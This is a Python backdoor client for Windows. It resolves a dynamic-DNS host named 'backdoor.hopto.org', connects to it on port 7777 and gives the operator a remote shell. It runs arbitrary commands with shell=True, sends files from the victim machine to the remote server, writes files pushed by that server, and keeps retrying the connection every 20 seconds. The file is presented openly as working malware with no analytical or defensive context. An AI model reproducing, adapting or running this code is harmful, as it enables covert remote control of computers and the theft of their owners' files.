#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os               #It's module for work OS
import time             #It's module for work time
import socket           #It's module for work socket
import subprocess       #It's module for work sys.command

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def change_unicode():
    """It's function for change unicode CMD"""
    os.system("chcp 866")
    os.system("cls")

def get_data():
    '''It's function for get information from server and decode'''
    data = client.recv(10240).decode('cp866')
    data = data.split()
    return data


def send_data(data):
    '''It's function for send information to server'''
    data = data.encode('cp866')
    client.send(data)


def main():
    '''It's function for call function and data processing'''
    change_unicode()
    while True:
        try:
            ip_addres = socket.gethostbyname("backdoor.hopto.org")
            print(ip_addres)
            break
        except:
            time.sleep(20)

    while True:
        try:
            print("Connect...")
            client.connect((ip_addres, 7777))
            
            while True:
                try:
                    command = get_data()
                    print(command)
            
                    if command[0] == 'cd':
                        os.chdir(command[1])
                        send_data('[+] Changed')
            
                    elif command[0] == 'download':
                        with open(command[1], 'rb') as file:
                            while file:
                                content = file.read(1228800000)

                                if not content:
                                    file.close()
                                    break
                        
                                else:
                                    client.send(content)
                                    time.sleep(1)

                        send_data('ST0P_syka_blyat')

                    elif command[0] == 'upload':
                        with open(command[1], 'wb') as file:
                            while True:
                                text = client.recv(1228800000)

                                if text == b'ST0P_syka_blyat':
                                    file.close()
                                    break

                                else:
                                    file.write(text)
            
                    elif command[0] == 'q':
                        client.close()
                        break
            
                    else:
                        information = subprocess.check_output(command, shell=True).decode('cp866')
                
                        if information == '':
                            send_data('...')
                        else:
                            send_data(information)

                except:
                    send_data("Error!")
        except:
            time.sleep(20)
            continue

    while True:
        try:
            command = get_data()
            print(command)
            
            if command[0] == 'cd':
                    os.chdir(command[1])
                    send_data('[+] Changed')
            
            elif command[0] == 'download':
                with open(command[1], 'rb') as file:
                    while file:
                        content = file.read(1228800000)

                        if not content:
                            file.close()
                            break
                        
                        else:
                            client.send(content)
                            time.sleep(1)

                send_data('ST0P_syka_blyat')

            elif command[0] == 'upload':
                with open(command[1], 'wb') as file:
                    while True:
                        text = client.recv(1228800000)

                        if text == b'ST0P_syka_blyat':
                            file.close()
                            break

                        else:
                            file.write(text)
            
            elif command[0] == 'q':
                break
            
            else:
                information = subprocess.check_output(command, shell=True).decode('cp866')
                
                if information == '':
                    send_data('...')
                else:
                    send_data(information)

        except:
            send_data("Error!")

if __name__ == '__main__':
    main()
